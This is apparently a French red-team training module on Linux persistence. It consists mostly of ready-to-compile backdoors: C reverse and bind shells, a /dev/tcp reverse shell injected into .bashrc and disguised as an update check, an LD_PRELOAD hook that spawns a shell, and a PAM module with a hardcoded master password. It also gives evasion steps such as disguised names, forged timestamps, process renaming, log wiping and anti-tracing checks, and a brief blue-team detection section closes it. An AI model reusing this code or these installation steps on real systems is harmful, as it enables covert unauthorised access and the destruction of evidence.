# Module 39 : Persistence Linux - Maintenir l'Accès

## 🎯 Ce que tu vas apprendre

Dans ce module, tu vas maîtriser les techniques de persistence sur Linux pour :
- Survivre aux redémarrages système
- Créer des backdoors furtifs
- Utiliser cron, systemd, et fichiers de configuration
- Implémenter des mécanismes de persistance multi-niveaux
- Éviter la détection par les administrateurs

## 📚 Théorie

### C'est quoi la Persistence ?

**Persistence** = capacité d'un malware/backdoor à **survivre** à :
- Redémarrage système
- Déconnexion utilisateur
- Mise à jour logicielle
- Nettoyage basique

**Objectif Red Team** : Maintenir l'accès à long terme sans être détecté.

### Pourquoi la Persistence ?

```ascii
SANS PERSISTENCE                   AVEC PERSISTENCE
═══════════════                    ════════════════

Exploitation                       Exploitation
     ↓                                  ↓
Shell obtenu                       Shell obtenu
     ↓                                  ↓
Accès au système                   Installation backdoor
     ↓                                  ↓
Reboot                             Reboot
     ↓                                  ↓
Accès PERDU ✗                      Backdoor se relance ✓
                                        ↓
                                   Accès maintenu
```

### Niveaux de Persistence Linux

```ascii
┌────────────────────────────────────────────────────────┐
│           NIVEAUX DE PERSISTENCE                       │
├────────────────────────────────────────────────────────┤
│                                                        │
│  NIVEAU 1 : USER-LEVEL (Sans root)                    │
│  ┌──────────────────────────────────────┐            │
│  │ ~/.bashrc, ~/.profile                 │            │
│  │ Crontab user                          │            │
│  │ ~/.config/autostart/*.desktop         │            │
│  │ Processus user en background          │            │
│  └──────────────────────────────────────┘            │
│       Privilèges: Limités                             │
│       Détection: Facile                               │
│       Survie: Moyenne                                 │
│                                                        │
│  NIVEAU 2 : SYSTEM-LEVEL (Root requis)                │
│  ┌──────────────────────────────────────┐            │
│  │ Systemd services                      │            │
│  │ /etc/cron.d/*                         │            │
│  │ /etc/rc.local                         │            │
│  │ PAM modules                            │            │
│  │ LD_PRELOAD hooks                      │            │
│  └──────────────────────────────────────┘            │
│       Privilèges: Élevés                              │
│       Détection: Modérée                              │
│       Survie: Haute                                   │
│                                                        │
│  NIVEAU 3 : KERNEL-LEVEL (Rootkit)                    │
│  ┌──────────────────────────────────────┐            │
│  │ Kernel modules malveillants           │            │
│  │ Syscall hooking                       │            │
│  │ Bootkit (MBR/UEFI infection)          │            │
│  └──────────────────────────────────────┘            │
│       Privilèges: Maximaux                            │
│       Détection: Très difficile                       │
│       Survie: Maximale                                │
│                                                        │
└────────────────────────────────────────────────────────┘
```

### Mécanismes de Lancement Linux

**1. Cron (Scheduled Tasks)**
```ascii
┌─────────────────────────────────────┐
│  CRON - Task Scheduler              │
├─────────────────────────────────────┤
│                                     │
│  User crontab                       │
│  /var/spool/cron/crontabs/<user>    │
│                                     │
│  System cron                        │
│  /etc/crontab                       │
│  /etc/cron.d/*                      │
│  /etc/cron.hourly/*                 │
│  /etc/cron.daily/*                  │
│  /etc/cron.weekly/*                 │
│  /etc/cron.monthly/*                │
│                                     │
│  @reboot: Lance au démarrage        │
│  */5 * * * *: Toutes les 5 min      │
│                                     │
└─────────────────────────────────────┘
```

**2. Systemd (Service Manager)**
```ascii
┌─────────────────────────────────────┐
│  SYSTEMD - Init System              │
├─────────────────────────────────────┤
│                                     │
│  User services                      │
│  ~/.config/systemd/user/*.service   │
│                                     │
│  System services                    │
│  /etc/systemd/system/*.service      │
│  /lib/systemd/system/*.service      │
│                                     │
│  Types:                             │
│  - simple: Process en foreground    │
│  - forking: Daemon en background    │
│  - oneshot: Une seule exécution     │
│                                     │
│  Targets (runlevels):               │
│  - multi-user.target (niveau 3)     │
│  - graphical.target (niveau 5)      │
│                                     │
└─────────────────────────────────────┘
```

**3. Shell Profiles**
```ascii
┌─────────────────────────────────────┐
│  SHELL STARTUP FILES                │
├─────────────────────────────────────┤
│                                     │
│  Login shells:                      │
│  /etc/profile                       │
│  ~/.bash_profile                    │
│  ~/.bash_login                      │
│  ~/.profile                         │
│                                     │
│  Interactive non-login:             │
│  ~/.bashrc                          │
│  ~/.zshrc                           │
│                                     │
│  Logout:                            │
│  ~/.bash_logout                     │
│                                     │
└─────────────────────────────────────┘
```

## 🔍 Visualisation

### Timeline de Boot Linux

```ascii
BOOT SEQUENCE - Opportunités de Persistence
════════════════════════════════════════════════════════

┌──────────────────────────────────────────────────────┐
│  1. BIOS/UEFI                                        │
│     ↓                                                │
│     [Bootkit possible - MBR/UEFI rootkit]           │
│     ↓                                                │
├──────────────────────────────────────────────────────┤
│  2. GRUB Bootloader                                  │
│     ↓                                                │
│     [Grub modules malveillants]                      │
│     ↓                                                │
├──────────────────────────────────────────────────────┤
│  3. Kernel Loading                                   │
│     ↓                                                │
│     [Kernel modules: /etc/modules-load.d/*.conf]     │
│     [initramfs hooks]                                │
│     ↓                                                │
├──────────────────────────────────────────────────────┤
│  4. systemd Init (PID 1)                             │
│     ↓                                                │
│     [Systemd services: *.service files]              │
│     ↓                                                │
│     sysinit.target                                   │
│        └→ /etc/systemd/system/*.service              │
│     ↓                                                │
│     basic.target                                     │
│     ↓                                                │
│     multi-user.target ← PERSISTENCE ICI              │
│        ├→ cron.service                               │
│        ├→ custom.service (notre backdoor)            │
│        └→ ssh.service                                │
│     ↓                                                │
├──────────────────────────────────────────────────────┤
│  5. Login                                            │
│     ↓                                                │
│     [PAM modules: /etc/pam.d/*]                      │
│     [/etc/profile, /etc/bash.bashrc]                 │
│     ↓                                                │
├──────────────────────────────────────────────────────┤
│  6. User Shell                                       │
│     ↓                                                │
│     [~/.bashrc, ~/.profile]                          │
│     [~/.config/autostart/*.desktop (GUI)]            │
│     ↓                                                │
│  → Système fully booted, backdoor actif              │
└──────────────────────────────────────────────────────┘
```

## 💻 Exemple pratique

### Technique 1 : Cron @reboot

**Backdoor qui se lance au reboot** :

```c
// backdoor.c - Reverse shell simple
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define C2_IP "192.168.1.100"
#define C2_PORT 4444

int main() {
    // Fork en background
    if (fork() != 0) exit(0);

    // Devenir leader de session
    setsid();

    // Fermer stdin/stdout/stderr
    close(0);
    close(1);
    close(2);

    // Connexion au C2
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        // Rediriger stdin/stdout/stderr vers socket
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        // Lancer shell
        char *args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);
    }

    return 0;
}
```

**Installation** :
```bash
# Compiler
gcc -o /tmp/.update backdoor.c

# Rendre exécutable
chmod +x /tmp/.update

# Ajouter dans crontab
(crontab -l 2>/dev/null; echo "@reboot /tmp/.update") | crontab -

# Vérifier
crontab -l
```

**Amélioration furtive** :
```bash
# Nom de fichier discret
mv /tmp/.update /tmp/.systemd-private-update

# Cacher dans dossier système (nécessite root)
mv /tmp/.update /lib/systemd/.update

# Crontab avec redirection pour éviter logs
(crontab -l; echo "@reboot /lib/systemd/.update >/dev/null 2>&1") | crontab -
```

### Technique 2 : Systemd Service

**Créer un service systemd persistant** :

```ini
# /etc/systemd/system/update-checker.service
[Unit]
Description=System Update Checker
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart=/usr/local/bin/update-checker
Restart=always
RestartSec=30
User=nobody
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
```

**Programme C du service** :
```c
// update-checker.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define C2_PORT 4444

volatile int running = 1;

void sighandler(int sig) {
    running = 0;
}

int main() {
    signal(SIGTERM, sighandler);
    signal(SIGINT, sighandler);

    // Créer socket d'écoute
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(C2_PORT);

    bind(server_fd, (struct sockaddr*)&addr, sizeof(addr));
    listen(server_fd, 1);

    // Boucle principale
    while (running) {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(server_fd, &readfds);

        struct timeval tv = {.tv_sec = 5, .tv_usec = 0};

        if (select(server_fd + 1, &readfds, NULL, NULL, &tv) > 0) {
            int client = accept(server_fd, NULL, NULL);
            if (client > 0) {
                // Fork pour gérer client
                if (fork() == 0) {
                    close(server_fd);
                    dup2(client, 0);
                    dup2(client, 1);
                    dup2(client, 2);
                    char *args[] = {"/bin/sh", NULL};
                    execve("/bin/sh", args, NULL);
                    exit(0);
                }
                close(client);
            }
        }
    }

    close(server_fd);
    return 0;
}
```

**Installation** :
```bash
# Compiler
gcc -o /usr/local/bin/update-checker update-checker.c

# Installer service
systemctl daemon-reload
systemctl enable update-checker.service
systemctl start update-checker.service

# Vérifier status
systemctl status update-checker
```

### Technique 3 : ~/.bashrc Injection

**Backdoor qui se lance à chaque ouverture de shell** :

```bash
# Ajouter à ~/.bashrc de manière furtive

# Code malveillant déguisé en fonction utilitaire
check_updates() {
    # Fonction légitime apparente
    command -v apt-get >/dev/null 2>&1 || return

    # Backdoor caché
    (nohup bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' &) 2>/dev/null
}

# Appel discret
check_updates &
```

**Installation automatique** :
```c
// bashrc_inject.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pwd.h>

const char *payload =
    "\n"
    "# System update check function\n"
    "check_updates() {\n"
    "    command -v apt-get >/dev/null 2>&1 || return\n"
    "    (nohup bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' &) 2>/dev/null\n"
    "}\n"
    "check_updates &\n";

int main() {
    // Obtenir home directory
    struct passwd *pw = getpwuid(getuid());
    if (!pw) return 1;

    char bashrc_path[256];
    snprintf(bashrc_path, sizeof(bashrc_path), "%s/.bashrc", pw->pw_dir);

    // Vérifier si déjà injecté
    FILE *f = fopen(bashrc_path, "r");
    if (f) {
        char line[512];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "check_updates")) {
                fclose(f);
                printf("Already injected\n");
                return 0;
            }
        }
        fclose(f);
    }

    // Injecter payload
    f = fopen(bashrc_path, "a");
    if (!f) {
        perror("fopen");
        return 1;
    }

    fwrite(payload, 1, strlen(payload), f);
    fclose(f);

    printf("Injected into %s\n", bashrc_path);
    return 0;
}
```

### Technique 4 : LD_PRELOAD Hook

**Hooker une fonction système pour persistence** :

```c
// preload_backdoor.c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

// Hook getuid() pour déclencher backdoor
uid_t getuid(void) {
    static uid_t (*real_getuid)(void) = NULL;
    static int triggered = 0;

    if (!real_getuid) {
        real_getuid = dlsym(RTLD_NEXT, "getuid");
    }

    // Déclencher backdoor une seule fois
    if (!triggered) {
        triggered = 1;

        // Fork pour ne pas bloquer le processus hôte
        if (fork() == 0) {
            // Code backdoor ici
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            struct sockaddr_in addr = {
                .sin_family = AF_INET,
                .sin_port = htons(4444),
                .sin_addr.s_addr = inet_addr("192.168.1.100")
            };

            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
                dup2(sock, 0);
                dup2(sock, 1);
                dup2(sock, 2);
                execl("/bin/sh", "sh", NULL);
            }
            exit(0);
        }
    }

    return real_getuid();
}
```

**Installation** :
```bash
# Compiler en bibliothèque partagée
gcc -shared -fPIC -o /tmp/libupdatecheck.so preload_backdoor.c

# Ajouter à /etc/ld.so.preload (nécessite root)
echo "/tmp/libupdatecheck.so" >> /etc/ld.so.preload

# Maintenant, tout programme qui appelle getuid() déclenche le backdoor
```

### Technique 5 : PAM Backdoor

**Backdoor via module PAM (auth bypass)** :

```c
// pam_backdoor.c
#define PAM_SM_AUTH
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>

#define BACKDOOR_PASSWORD "s3cr3t_p4ss"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {
    const char *user;
    const char *password;

    // Obtenir username et password
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    // Si password backdoor, autoriser
    if (password && strcmp(password, BACKDOOR_PASSWORD) == 0) {
        return PAM_SUCCESS;
    }

    // Sinon, continuer vérification normale
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                               int argc, const char **argv) {
    return PAM_SUCCESS;
}
```

**Installation** :
```bash
# Compiler
gcc -fPIC -shared -o pam_backdoor.so pam_backdoor.c -lpam

# Copier dans répertoire PAM
cp pam_backdoor.so /lib/x86_64-linux-gnu/security/

# Modifier /etc/pam.d/common-auth
# Ajouter en première ligne:
# auth sufficient pam_backdoor.so

# Maintenant, mot de passe backdoor fonctionne pour tout compte
```

## 🎯 Application Red Team

### 1. Persistence Multi-Niveaux

**Stratégie défensive en profondeur** :
```bash
# Niveau 1: User cron
(crontab -l; echo "@reboot /tmp/.update") | crontab -

# Niveau 2: Systemd service
systemctl enable backdoor.service

# Niveau 3: .bashrc
echo "(/tmp/.update &)" >> ~/.bashrc

# Niveau 4: LD_PRELOAD
echo "/tmp/hook.so" >> /etc/ld.so.preload

# Si un est supprimé, les autres survivent
```

### 2. Cacher les Traces

**Techniques de furtivité** :
```bash
# Noms de fichiers légitimes
mv backdoor /lib/systemd/.systemd-update-check
mv backdoor.service update-notifier.service

# Timestamps falsifiés
touch -r /bin/ls /tmp/backdoor

# Processus renommé
exec -a "[kworker/0:1]" /tmp/backdoor

# Nettoyer logs
echo "" > /var/log/auth.log
echo "" > ~/.bash_history
```

### 3. Detection Evasion

**Éviter la détection** :
```c
// Backdoor qui vérifie l'environnement avant de s'activer
int is_being_monitored() {
    // Vérifier si strace/ltrace actif
    if (access("/proc/self/status", R_OK) == 0) {
        FILE *f = fopen("/proc/self/status", "r");
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "TracerPid:\t0") == NULL) {
                fclose(f);
                return 1;  // Tracer détecté
            }
        }
        fclose(f);
    }

    // Vérifier si parent est suspect
    if (getppid() == 1) {
        return 0;  // OK, parent est init
    }

    return 0;  // Safe
}

int main() {
    if (is_being_monitored()) {
        // Comportement normal si monitored
        printf("Checking for updates...\n");
        exit(0);
    }

    // Sinon, activer backdoor
    activate_backdoor();
}
```

## 📝 Points clés

### À retenir absolument

1. **Niveaux de Persistence**
   - User-level : Facile mais fragile
   - System-level : Nécessite root, plus robuste
   - Kernel-level : Maximum stealth, complexe

2. **Techniques principales**
   - Cron (@reboot ou périodique)
   - Systemd services
   - Shell profiles (.bashrc)
   - LD_PRELOAD hooks
   - PAM modules

3. **Furtivité**
   - Noms de fichiers légitimes
   - Timestamps falsifiés
   - Redirection logs vers /dev/null
   - Processus renommés

4. **Défense en profondeur**
   - Utiliser plusieurs techniques simultanément
   - Si une est détectée, les autres survivent

### Commandes de détection (Blue Team)

```bash
# Vérifier crontabs
crontab -l
ls -la /etc/cron.*
cat /etc/crontab

# Vérifier systemd services
systemctl list-unit-files --state=enabled
systemctl list-units --type=service

# Vérifier LD_PRELOAD
cat /etc/ld.so.preload
echo $LD_PRELOAD

# Vérifier PAM
ls -la /etc/pam.d/
ls -la /lib/*/security/pam_*.so

# Vérifier bashrc suspects
find /home -name ".bashrc" -exec grep -H "bash -i" {} \;
```

## ➡️ Prochaine étape

**Module 40 : Mach-O Format (macOS)**

Maintenant que tu maîtrises la persistence Linux, le prochain module t'introduit au monde macOS avec le format Mach-O, équivalent d'ELF sur macOS.

## 📚 Ressources

- [MITRE ATT&CK - Persistence](https://attack.mitre.org/tactics/TA0003/)
- [Systemd Service Hardening](https://www.freedesktop.org/software/systemd/man/systemd.exec.html)
- [Linux Persistence Techniques](https://github.com/carlospolop/PEASS-ng)
- [Cron Security](https://linux.die.net/man/5/crontab)
